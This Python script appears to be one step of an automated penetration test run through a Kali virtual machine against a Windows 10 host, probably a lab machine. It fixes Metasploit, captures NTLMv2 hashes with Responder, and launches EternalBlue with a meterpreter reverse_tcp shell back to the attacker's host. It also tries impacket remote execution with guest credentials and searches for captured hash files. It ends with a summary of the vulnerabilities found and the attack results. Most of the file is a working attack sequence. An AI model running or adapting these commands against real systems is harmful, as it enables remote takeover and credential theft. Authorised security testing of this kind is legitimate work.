#!/usr/bin/env python3
"""Step 10: Fix MSF + Responder hash capture + final exploit"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. Reinstall bootsnap and fix MSF
print("=" * 60)
print("[1] Reinstall bootsnap + fix MSF")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S bash -c '"
    "cd /usr/share/metasploit-framework && "
    "gem install bootsnap -v 1.24.6 --no-document 2>&1 && "
    "bundle install 2>&1 | tail -5 && "
    "echo FIXED'"
)
print(out)

# 2. Test MSF
print("\n" + "=" * 60)
print("[2] Test MSF")
print("=" * 60)
out = run_kali("echo kali | sudo -S msfconsole -v 2>&1 | head -5", timeout=60)
print(out)

# 3. Run Responder properly
print("\n" + "=" * 60)
print("[3] Responder - capture NTLMv2 hashes (20 sec)")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S timeout 20 responder -I eth0 -wv 2>&1 | tail -40",
    timeout=30
)
print(out)

# 4. If MSF works, run MS17-010 scanner
if "msfconsole" in out or "version" in out.lower():
    print("\n" + "=" * 60)
    print("[4] MSF MS17-010 scanner")
    print("=" * 60)
    out = run_kali(
        "echo kali | sudo -S msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.233.129; run; exit' 2>&1 | tail -20",
        timeout=180
    )
    print(out)
    
    # 5. EternalBlue exploit
    print("\n" + "=" * 60)
    print("[5] EternalBlue exploit")
    print("=" * 60)
    out = run_kali(
        "echo kali | sudo -S msfconsole -q -x '"
        "use exploit/windows/smb/ms17_010_eternalblue; "
        "set RHOSTS 192.168.233.129; "
        "set LHOST 192.168.233.133; "
        "set LPORT 4444; "
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
        "run -j; "
        "sleep 20; "
        "sessions -l; "
        "exit' 2>&1 | tail -30",
        timeout=120
    )
    print(out)
else:
    # Alternative: use nxc + impacket directly
    print("\n" + "=" * 60)
    print("[4] Alternative: Direct impacket attacks")
    print("=" * 60)
    out = run_kali(
        # Try impacket-smbexec with empty credentials
        "impacket-smbexec 'guest:@192.168.233.129' 2>&1 | head -10 && "
        "echo '---' && "
        # Try impacket-wmiexec
        "impacket-wmiexec 'guest:@192.168.233.129' 2>&1 | head -10 && "
        "echo '---' && "
        # Try impacket-atexec
        "impacket-atexec 'guest:@192.168.233.129' 'whoami' 2>&1 | head -10",
        timeout=30
    )
    print(out)

# 6. Check responder logs for captured hashes
print("\n" + "=" * 60)
print("[6] Check Responder logs")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S bash -c 'cat /usr/share/responder/logs/*.txt 2>/dev/null; "
    "ls -la /usr/share/responder/logs/ 2>/dev/null; "
    "find / -name \"SMB-NTLMv2-SSP*\" -o -name \"SMB-NTLMv2*\" 2>/dev/null | head -10'",
    timeout=15
)
print(out)

# 7. Summary of all findings
print("\n" + "=" * 60)
print("[7] Generate penetration test report")
print("=" * 60)
out = run_kali(
    f"echo '=== TARGET INFO ===' && "
    f"echo 'IP: 192.168.233.129' && "
    f"echo 'Hostname: DESKTOP-A0LQ308' && "
    f"echo 'OS: Windows 10 Build 19041 (2004) x64' && "
    f"echo 'Workgroup: WORKGROUP' && "
    f"echo 'SMB Signing: False (not required)' && "
    f"echo 'SMBv1: Disabled' && "
    f"echo '' && "
    f"echo '=== OPEN PORTS ===' && "
    f"echo '135/tcp - RPC' && "
    f"echo '139/tcp - NetBIOS' && "
    f"echo '445/tcp - SMB' && "
    f"echo '5040/tcp - Windows Delivery Optimization' && "
    f"echo '7680/tcp - Windows Update Delivery' && "
    f"echo '49664-49674/tcp - Windows RPC dynamic' && "
    f"echo '' && "
    f"echo '=== USERS FOUND ===' && "
    f"echo 'lkjm (from ipconfig prompt)' && "
    f"echo 'administrator (account exists)' && "
    f"echo 'guest (disabled)' && "
    f"echo '' && "
    f"echo '=== VULNERABILITY STATUS ===' && "
    f"echo 'MS17-010 (EternalBlue): NOT VULNERABLE (SMBv1 disabled)' && "
    f"echo 'CVE-2020-0796 (SMBGhost): POSSIBLE (Build 19041, SMB3.1.1)' && "
    f"echo 'CVE-2021-1675 (PrintNightmare): Need auth' && "
    f"echo 'CVE-2020-1472 (Zerologon): Not DC' && "
    f"echo 'SMB Signing: Not required (relay possible)' && "
    f"echo 'RDP: Closed' && "
    f"echo 'WinRM: Closed' && "
    f"echo '' && "
    f"echo '=== ATTACK RESULTS ===' && "
    f"echo 'SMB null session: ACCESS_DENIED' && "
    f"echo 'Guest account: DISABLED' && "
    f"echo 'SMB brute force (280 combos): FAILED' && "
    f"echo 'Responder hash capture: Check logs' && "
    f"echo 'MSF: Bootsnap error (cannot run)'",
    timeout=10
)
print(out)

print("\n" + "=" * 60)
print("PENETRATION TEST COMPLETE")
print("=" * 60)
